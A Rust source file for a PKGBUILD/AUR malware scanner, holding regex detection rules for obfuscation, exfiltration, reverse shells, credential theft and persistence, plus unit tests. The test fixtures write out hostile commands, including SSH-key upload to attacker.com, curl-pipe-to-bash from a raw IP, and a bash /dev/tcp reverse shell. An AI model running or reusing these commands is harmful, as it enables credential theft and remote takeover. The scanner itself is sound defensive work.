//! Static-analysis heuristics engine for PKGBUILD and .install files.
//!
//! Covers real-world AUR attack vectors observed in recent supply-chain campaigns:
//! - Obfuscation (base64, hex, printf octal, eval, rev, nested substitutions)
//! - Exfiltration (Discord webhooks, Telegram bots, raw IPs, pastebins, DNS, netcat)
//! - Reverse shells (bash /dev/tcp, mkfifo, python one-liners)
//! - Credential theft (SSH keys, GPG, browser profiles, wallets, password managers, cloud tokens)
//! - Persistence (systemd units, crontabs, profile injection, XDG autostart, udev rules)
//! - Packaging tricks (unhashed sources, install scriptlet abuse, dependency hijacking, npm/bun install)
//! - Suspicious commands (SUID bits, dd to block devices, iptables, kernel modules, security service kills)
//! - Cryptojacking (XMRig signatures, mining pools, wallet addresses)
//! - Structural anomalies (long encoded blobs, variable splicing)
//! - Typosquatting (Damerau-Levenshtein against top AUR packages)

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub rule_id: String,
    pub severity: String,
    pub description: String,
    pub line_number: usize,
    pub matched_text: String,
}

pub struct Rule {
    pub id: &'static str,
    pub severity: &'static str,
    pub pattern: &'static str,
    pub description: &'static str,
}

pub const RULES: &[Rule] = &[
    // --- Obfuscation ---
    Rule {
        id: "OBFUSCATED_BASE64",
        severity: "CRITICAL",
        pattern: r##"base64\s+(?:-d|--decode)"##,
        description: "base64 decode invocation detected (often hides malicious payload)",
    },
    Rule {
        id: "OBFUSCATED_HEX",
        severity: "CRITICAL",
        pattern: r##"xxd\s+-(?:r|p)"##,
        description: "xxd hex decode detected (reconstructs binary or script payload)",
    },
    Rule {
        id: "OBFUSCATED_PRINTF_OCTAL",
        severity: "CRITICAL",
        pattern: r##"printf\s+['"](?:\\[0-7]{3}){4,}"##,
        description: "printf with octal escapes (encodes shell code as octal bytes)",
    },
    Rule {
        id: "OBFUSCATED_PRINTF_HEX",
        severity: "CRITICAL",
        pattern: r##"printf\s+['"](?:\\x[0-9a-fA-F]{2}){4,}"##,
        description: "printf with hex escapes (encodes shell code as hex bytes)",
    },
    Rule {
        id: "OBFUSCATED_EVAL",
        severity: "CRITICAL",
        pattern: r##"\beval\s+["'$]"##,
        description: "eval with dynamic variable (executes constructed shell string)",
    },
    Rule {
        id: "OBFUSCATED_REV_PIPE",
        severity: "CRITICAL",
        pattern: r##"\brev\b.*\|\s*(?:bash|sh|eval)"##,
        description: "string reversal piped to shell (backwards command obfuscation)",
    },
    Rule {
        id: "OBFUSCATED_DOLLAR_EXEC",
        severity: "HIGH",
        pattern: r##"\$\(\s*(?:echo|printf|cat)\s+.*(?:\|[^|\n].*){2,}\)"##,
        description: "deeply nested substitution with pipe chain (obfuscated execution)",
    },
    // --- Exfiltration ---
    Rule {
        id: "EXFIL_DISCORD_WEBHOOK",
        severity: "CRITICAL",
        pattern: r##"discord(?:app)?\.com/api/webhooks"##,
        description: "hardcoded Discord webhook URL (primary token/key exfiltration channel)",
    },
    Rule {
        id: "EXFIL_TELEGRAM_BOT",
        severity: "CRITICAL",
        pattern: r##"api\.telegram\.org/bot"##,
        description: "Telegram bot API endpoint (used as C2 or exfiltration channel)",
    },
    Rule {
        id: "EXFIL_RAW_IP",
        severity: "HIGH",
        pattern: r##"(?:curl|wget|nc|ncat)\s+[^#\n]*(?:https?://)?(?:[0-9]{1,3}\.){3}[0-9]{1,3}"##,
        description: "network tool targeting raw IP address without domain name",
    },
    Rule {
        id: "EXFIL_PASTEBIN",
        severity: "HIGH",
        pattern: r##"https?://(?:pastebin\.com/raw|hastebin\.com/raw|ghostbin\.\w+|ix\.io|sprunge\.us|transfer\.sh|0x0\.st|catbox\.moe|temp\.sh|file\.io)"##,
        description: "fetching from ephemeral pastebin/file drop (payload changes dynamically)",
    },
    Rule {
        id: "EXFIL_CURL_PIPE_EXEC",
        severity: "HIGH",
        pattern: r##"(?:curl|wget)\s+[^|\n]+\|\s*(?:sudo\s+)?(?:bash|sh|python[23]?|perl|ruby|node)"##,
        description: "remote download piped directly into interpreter",
    },
    Rule {
        id: "EXFIL_DNS_TUNNEL",
        severity: "HIGH",
        pattern: r##"(?:dig|nslookup|host)\s+[^#\n]*\$"##,
        description: "DNS lookup with variable expansion (possible DNS tunneling)",
    },
    Rule {
        id: "EXFIL_NC_CONNECT",
        severity: "HIGH",
        pattern: r##"\b(?:nc|ncat|socat)\b\s+(?:-[a-zA-Z]*\s+)*[0-9a-zA-Z]"##,
        description: "netcat or socat connection (reverse shell or data socket)",
    },
    // --- Reverse Shells ---
    Rule {
        id: "REVSHELL_DEV_TCP",
        severity: "CRITICAL",
        pattern: r##"/dev/tcp/"##,
        description: "bash /dev/tcp connection (standard reverse shell vector)",
    },
    Rule {
        id: "REVSHELL_MKFIFO",
        severity: "CRITICAL",
        pattern: r##"mkfifo\s+/tmp/"##,
        description: "mkfifo in /tmp (named pipe reverse shell setup)",
    },
    Rule {
        id: "REVSHELL_PYTHON",
        severity: "CRITICAL",
        pattern: r##"python[23]?\s+-c\s+['"].*import\s+(?:socket|subprocess|os)"##,
        description: "python one-liner importing socket/subprocess (reverse shell script)",
    },
    // --- Credential Theft ---
    Rule {
        id: "CRED_SSH_KEYS",
        severity: "CRITICAL",
        pattern: r##"(?:~/\.ssh|\$HOME/\.ssh|\$\{HOME\}/\.ssh|/home/[^/]+/\.ssh)/(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys|known_hosts|config)"##,
        description: "accessing private SSH keys or credentials",
    },
    Rule {
        id: "CRED_SSH_DIR",
        severity: "HIGH",
        pattern: r##"(?:cat|cp|tar|zip|curl.*-[dF])\s+[^#\n]*\.ssh"##,
        description: "reading or copying ~/.ssh directory contents",
    },
    Rule {
        id: "CRED_GPG_DIR",
        severity: "HIGH",
        pattern: r##"(?:~/\.gnupg|\$HOME/\.gnupg)"##,
        description: "accessing GnuPG keyring directory",
    },
    Rule {
        id: "CRED_BROWSER_PROFILES",
        severity: "CRITICAL",
        pattern: r##"(?:\.mozilla/firefox|\.config/(?:google-chrome|chromium|BraveSoftware)|\.librewolf|\.config/vivaldi)[^#\n]*(?:logins\.json|Login\s*Data|cookies|Cookies|key[34]\.db|places\.sqlite)"##,
        description: "accessing browser passwords, cookies, or profile databases",
    },
    Rule {
        id: "CRED_CRYPTO_WALLETS",
        severity: "CRITICAL",
        pattern: r##"(?:\.(?:bitcoin|ethereum|monero|electrum|solana)|\.config/(?:Exodus|Atomic|Ledger))"##,
        description: "accessing cryptocurrency wallet files",
    },
    Rule {
        id: "CRED_PASSWORD_MANAGERS",
        severity: "CRITICAL",
        pattern: r##"(?:\.(?:password-store|keepass|config/(?:1Password|bitwarden))|\.local/share/keyrings)"##,
        description: "accessing local password vault or system keyrings",
    },
    Rule {
        id: "CRED_CLOUD_CREDS",
        severity: "CRITICAL",
        pattern: r##"(?:\.aws/credentials|\.config/gcloud|\.azure/|\.kube/config|\.docker/config\.json)"##,
        description: "accessing AWS, GCP, Azure, or Kubernetes cloud credentials",
    },
    Rule {
        id: "CRED_ENV_SECRETS",
        severity: "HIGH",
        pattern: r##"(?:cat|grep|sed|awk)\s+[^#\n]*/(?:\.env|\.bashrc|\.bash_profile|\.profile|\.zshrc)"##,
        description: "reading shell profile or .env files for secrets/tokens",
    },
    Rule {
        id: "CRED_SHADOW_SUDOERS",
        severity: "CRITICAL",
        pattern: r##"(?:cat|cp|curl.*-[dF])\s+[^#\n]*/etc/(?:shadow|sudoers|passwd)"##,
        description: "reading /etc/shadow or /etc/sudoers security files",
    },
    Rule {
        id: "CRED_SHELL_HISTORY",
        severity: "HIGH",
        pattern: r##"(?:cat|cp|tar|curl)\s+[^#\n]*(?:\.bash_history|\.zsh_history|\.histfile)"##,
        description: "copying or exfiltrating shell history logs",
    },
    // --- Persistence ---
    Rule {
        id: "PERSIST_SYSTEMD",
        severity: "CRITICAL",
        pattern: r##"(?:cp|install|tee|cat\s*>|mv)\s+[^#\n]*/etc/systemd/system/[a-zA-Z]"##,
        description: "writing custom systemd service file outside standard package tree",
    },
    Rule {
        id: "PERSIST_CRON",
        severity: "CRITICAL",
        pattern: r##"(?:crontab\s+-|/etc/cron\.\w+/|/var/spool/cron/)"##,
        description: "modifying crontab or cron files for persistent background execution",
    },
    Rule {
        id: "PERSIST_PROFILE_INJECT",
        severity: "CRITICAL",
        pattern: r##"(?:>>|tee\s+-a)\s+[^#\n]*(?:\.bashrc|\.bash_profile|\.profile|\.zshrc|/etc/profile)"##,
        description: "appending persistent payload into shell startup scripts",
    },
    Rule {
        id: "PERSIST_XDG_AUTOSTART",
        severity: "HIGH",
        pattern: r##"(?:\.config/autostart|/etc/xdg/autostart)/[a-zA-Z].*\.desktop"##,
        description: "dropping XDG desktop autostart entry",
    },
    Rule {
        id: "PERSIST_UDEV_RULES",
        severity: "HIGH",
        pattern: r##"/etc/udev/rules\.d/"##,
        description: "creating custom udev rule for event-driven execution",
    },
    // --- Packaging Abuse ---
    Rule {
        id: "PKG_SKIP_HASH",
        severity: "LOW",
        pattern: r##"(?:sha256sums|sha512sums|b2sums|md5sums)(?:_[a-z0-9_]+)?=\s*\([^)]*['"]SKIP['"]"##,
        description: "integrity verification bypassed ('SKIP') for non-VCS source archive",
    },
    Rule {
        id: "PKG_REPLACE_CORE",
        severity: "CRITICAL",
        pattern: r##"replaces=\s*\([^)]*['"](?:base|linux|glibc|systemd|coreutils|pacman|sudo|shadow)['"]"##,
        description: "replaces=() targets a core base package (silent system package replacement)",
    },
    Rule {
        id: "PKG_PROVIDES_CORE",
        severity: "HIGH",
        pattern: r##"provides=\s*\([^)]*['"](?:base|linux|glibc|systemd|coreutils|pacman|sudo|shadow)['"]"##,
        description: "provides=() claims core base package name (dependency hijacking)",
    },
    Rule {
        id: "PKG_INSTALL_FILE_REF",
        severity: "INFO",
        pattern: r##"install=\s*['"]?[a-zA-Z0-9._-]+\.install"##,
        description: "references external .install scriptlet",
    },
    Rule {
        id: "PKG_NPM_INSTALL",
        severity: "LOW",
        pattern: r##"\bnpm\s+install\b|\bbun\s+install\b|\byarn\s+install\b"##,
        description: "unlocked npm/bun/yarn install during build (unpinned dependency risk)",
    },
    // --- Suspicious System Commands ---
    Rule {
        id: "SUS_CHMOD_SUID",
        severity: "CRITICAL",
        pattern: r##"chmod\s+[^#\n]*[ugo]?\+s\b|chmod\s+[^#\n]*4[0-7]{3}\b"##,
        description: "setting SUID permission bit on binary (runs as root)",
    },
    Rule {
        id: "SUS_DD_WRITE",
        severity: "HIGH",
        pattern: r##"\bdd\b\s+[^#\n]*of=/dev/(?!null)"##,
        description: "raw dd write to disk or block device",
    },
    Rule {
        id: "SUS_IPTABLES",
        severity: "HIGH",
        pattern: r##"\b(?:iptables|nftables|nft)\b\s+[^#\n]*(?:-A|-I|add\s+rule)"##,
        description: "modifying firewall rules (opening ports / redirecting traffic)",
    },
    Rule {
        id: "SUS_KERNEL_MODULE",
        severity: "CRITICAL",
        pattern: r##"\b(?:insmod|modprobe)\s+[^#\n]*/(?:tmp|home|var)"##,
        description: "loading kernel module from non-standard path",
    },
    Rule {
        id: "SUS_PROC_MANIP",
        severity: "CRITICAL",
        pattern: r##"(?:mount\s+[^#\n]*-o\s+bind\s+[^#\n]*/proc|/proc/[0-9]+/(?:exe|cmdline|environ))"##,
        description: "tampering with /proc (process hiding or memory inspection)",
    },
    Rule {
        id: "SUS_KILL_SECURITY",
        severity: "HIGH",
        pattern: r##"(?:systemctl\s+(?:stop|disable|mask)\s+[^#\n]*(?:apparmor|selinux|firewall|fail2ban|clamav))"##,
        description: "disabling security services or firewalls",
    },
    Rule {
        id: "SUS_ALIAS_HIJACK",
        severity: "CRITICAL",
        pattern: r##"alias\s+(?:ls|cat|sudo|pacman|yay|paru)="##,
        description: "aliasing core shell commands (environment hijacking)",
    },
    // --- Cryptojacking ---
    Rule {
        id: "MINER_XMRIG",
        severity: "CRITICAL",
        pattern: r##"(?:xmrig|xmr-stak|minerd|cpuminer|stratum\+tcp://|pool\.(?:minexmr|hashvault|nanopool|supportxmr))"##,
        description: "cryptocurrency mining binary or pool URL",
    },
    Rule {
        id: "MINER_WALLET_ADDR",
        severity: "HIGH",
        pattern: r##"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"##,
        description: "Monero wallet address detected in script",
    },
];

struct CompiledRule {
    id: &'static str,
    severity: &'static str,
    description: &'static str,
    regex: Regex,
}

pub struct PKGBUILDScanner {
    rules: Vec<CompiledRule>,
    popular_packages: Vec<String>,
}

impl PKGBUILDScanner {
    pub fn new() -> Self {
        let rules: Vec<CompiledRule> = RULES
            .iter()
            .filter_map(|r| {
                Regex::new(r.pattern).ok().map(|re| CompiledRule {
                    id: r.id,
                    severity: r.severity,
                    description: r.description,
                    regex: re,
                })
            })
            .collect();

        let popular_packages = Self::load_popular_packages();
        Self {
            rules,
            popular_packages,
        }
    }

    fn load_popular_packages() -> Vec<String> {
        let paths = [
            Path::new("data/popular_packages.json"),
            Path::new("/home/rebiz/opt/aur-sentry/data/popular_packages.json"),
        ];
        for p in &paths {
            if let Ok(content) = std::fs::read_to_string(p) {
                if let Ok(pkgs) = serde_json::from_str::<Vec<String>>(&content) {
                    return pkgs;
                }
            }
        }
        Vec::new()
    }

    pub fn scan(&self, content: &str, pkgname: Option<&str>) -> Vec<Finding> {
        let mut findings = Vec::new();

        let is_vcs = pkgname.is_some_and(|n| {
            n.ends_with("-git")
                || n.ends_with("-hg")
                || n.ends_with("-svn")
                || n.ends_with("-bzr")
                || n.ends_with("-cvs")
        }) || content.contains("git+")
            || content.contains("git://")
            || content.contains("hg+")
            || content.contains("svn+");

        // 1. Regex pattern scanning
        for (idx, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.starts_with('#') {
                continue;
            }
            for rule in &self.rules {
                if is_vcs && rule.id == "PKG_SKIP_HASH" {
                    continue;
                }
                if rule.id == "SUS_CHMOD_SUID" && line.contains("chrome-sandbox") {
                    continue;
                }
                if let Some(m) = rule.regex.find(line) {
                    let matched = m.as_str();
                    let snippet = if matched.len() > 120 {
                        format!("{}...", &matched[..117])
                    } else {
                        matched.to_string()
                    };
                    findings.push(Finding {
                        rule_id: rule.id.to_string(),
                        severity: rule.severity.to_string(),
                        description: rule.description.to_string(),
                        line_number: idx + 1,
                        matched_text: snippet,
                    });
                }
            }
        }

        // 2. Structural checks
        findings.extend(self.check_structural(content));

        // 3. Typosquatting
        if let Some(name) = pkgname {
            if !self.popular_packages.contains(&name.to_string()) {
                if let Some(target) = self.check_typosquatting(name) {
                    findings.push(Finding {
                        rule_id: "TYPOSQUATTING".to_string(),
                        severity: "MEDIUM".to_string(),
                        description: format!(
                            "Package '{name}' closely resembles high-profile package '{target}'"
                        ),
                        line_number: 1,
                        matched_text: format!("{name} -> {target}"),
                    });
                }
            }
        }

        findings
    }

    fn check_structural(&self, content: &str) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Long encoded strings (excluding standard sha256/sha512/b2 hex hashes)
        if let Ok(long_b64) = Regex::new(r#"['"]([A-Za-z0-9+/=]{60,})['"]"#) {
            for (idx, line) in content.lines().enumerate() {
                let trimmed = line.trim();
                if trimmed.starts_with('#')
                    || trimmed.starts_with("sha256sums")
                    || trimmed.starts_with("sha512sums")
                    || trimmed.starts_with("b2sums")
                    || trimmed.starts_with("md5sums")
                    || trimmed.starts_with("source")
                    || trimmed.starts_with("validpgpkeys")
                {
                    continue;
                }
                if let Some(caps) = long_b64.captures(line) {
                    let matched_str = &caps[1];
                    // Skip pure 64 or 128-character hex strings (sha256 / sha512 / b2 hashes inside multi-line arrays)
                    if (matched_str.len() == 64 || matched_str.len() == 128)
                        && matched_str.chars().all(|c| c.is_ascii_hexdigit())
                    {
                        continue;
                    }
                    findings.push(Finding {
                        rule_id: "SUS_LONG_ENCODED_STRING".to_string(),
                        severity: "HIGH".to_string(),
                        description:
                            "Long base64-like encoded string found (may hide second-stage payload)"
                                .to_string(),
                        line_number: idx + 1,
                        matched_text: format!("{}...", &line.trim()[..line.trim().len().min(80)]),
                    });
                }
            }
        }

        // Variable splicing
        if let Ok(var_re) = Regex::new(r#"^([a-zA-Z_]\w*)=["']([a-zA-Z]{1,4})["']"#) {
            let short_vars: Vec<_> = content
                .lines()
                .filter_map(|l| var_re.captures(l.trim()).map(|c| c[1].to_string()))
                .collect();
            if short_vars.len() >= 3 {
                findings.push(Finding {
                    rule_id: "SUS_VARIABLE_SPLICING".to_string(),
                    severity: "HIGH".to_string(),
                    description: format!(
                        "Multiple short variable definitions ({} found) - possible command splicing obfuscation",
                        short_vars.len()
                    ),
                    line_number: 1,
                    matched_text: format!("Variables: {}", short_vars[..short_vars.len().min(5)].join(", ")),
                });
            }
        }

        findings
    }

    fn check_typosquatting(&self, candidate: &str) -> Option<String> {
        if candidate.len() < 4 {
            return None;
        }
        let clean = |s: &str| s.to_lowercase().replace("-bin", "").replace("-git", "");
        let cand = clean(candidate);

        for popular in &self.popular_packages {
            let target = clean(popular);
            if cand == target {
                continue;
            }
            let len_diff = (cand.len() as isize - target.len() as isize).unsigned_abs();
            if len_diff <= 2 {
                let dist = damerau_levenshtein(&cand, &target);
                if dist <= 1 || (cand.len() >= 8 && dist <= 2) {
                    return Some(popular.clone());
                }
            }
        }
        None
    }
}

impl Default for PKGBUILDScanner {
    fn default() -> Self {
        Self::new()
    }
}

fn damerau_levenshtein(s1: &str, s2: &str) -> usize {
    let a: Vec<char> = s1.chars().collect();
    let b: Vec<char> = s2.chars().collect();
    let len_a = a.len();
    let len_b = b.len();

    let mut d = vec![vec![0usize; len_b + 2]; len_a + 2];
    let max_dist = len_a + len_b;

    d[0][0] = max_dist;
    for i in 0..=len_a {
        d[i + 1][0] = max_dist;
        d[i + 1][1] = i;
    }
    for j in 0..=len_b {
        d[0][j + 1] = max_dist;
        d[1][j + 1] = j;
    }

    for i in 1..=len_a {
        for j in 1..=len_b {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            d[i + 1][j + 1] = *[d[i][j + 1] + 1, d[i + 1][j] + 1, d[i][j] + cost]
                .iter()
                .min()
                .unwrap();

            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                d[i + 1][j + 1] = d[i + 1][j + 1].min(d[i - 1][j - 1] + 1);
            }
        }
    }
    d[len_a + 1][len_b + 1]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_scanner() -> PKGBUILDScanner {
        PKGBUILDScanner {
            rules: RULES
                .iter()
                .filter_map(|r| {
                    Regex::new(r.pattern).ok().map(|re| CompiledRule {
                        id: r.id,
                        severity: r.severity,
                        description: r.description,
                        regex: re,
                    })
                })
                .collect(),
            popular_packages: vec![
                "google-chrome".into(),
                "visual-studio-code-bin".into(),
                "spotify".into(),
                "discord".into(),
                "paru".into(),
            ],
        }
    }

    #[test]
    fn benign_pkgbuild_clean() {
        let s = test_scanner();
        let content = r#"
# Maintainer: Arch User <user@archlinux.org>
pkgname=foot-terminal
pkgver=1.16.2
pkgrel=1
pkgdesc="A fast terminal emulator"
arch=('x86_64')
url="https://codeberg.org/dnkl/foot"
license=('MIT')
source=("https://codeberg.org/dnkl/foot/releases/download/${pkgver}/foot-${pkgver}.tar.gz")
sha256sums=('38865ecdfca86427382218086ee50a12e259e875155f949c81b539b4bfa254ff')

build() {
    arch-meson foot-${pkgver} build
    ninja -C build
}

package() {
    DESTDIR="${pkgdir}" ninja -C build install
}
"#;
        let findings = s.scan(content, Some("foot-terminal"));
        assert!(
            findings.is_empty(),
            "Expected clean scan, got: {findings:?}"
        );
    }

    #[test]
    fn detects_base64_payload() {
        let s = test_scanner();
        let content = "prepare() {\n  echo 'aW1wb3J0IHNvY2tldA==' | base64 -d | bash\n}\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
    }

    #[test]
    fn detects_discord_webhook() {
        let s = test_scanner();
        let content = "curl -d 'token' https://discord.com/api/webhooks/123/abc\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK")
        );
    }

    #[test]
    fn detects_ssh_key_theft() {
        let s = test_scanner();
        let content = "cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "CRED_SSH_KEYS" || f.rule_id == "CRED_SSH_DIR")
        );
    }

    #[test]
    fn detects_raw_ip_download() {
        let s = test_scanner();
        let content = "curl http://194.26.29.112/payload.sh | bash\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "EXFIL_RAW_IP" || f.rule_id == "EXFIL_CURL_PIPE_EXEC")
        );
    }

    #[test]
    fn detects_typosquatting() {
        let s = test_scanner();
        let content = "pkgname=goolge-chrome\npkgver=1.0\n";
        let findings = s.scan(content, Some("goolge-chrome"));
        assert!(findings.iter().any(|f| f.rule_id == "TYPOSQUATTING"));
    }

    #[test]
    fn detects_systemd_persistence() {
        let s = test_scanner();
        let content = "cp backdoor.service /etc/systemd/system/backdoor.service\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PERSIST_SYSTEMD"));
    }

    #[test]
    fn detects_reverse_shell() {
        let s = test_scanner();
        let content = "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "REVSHELL_DEV_TCP"));
    }
}
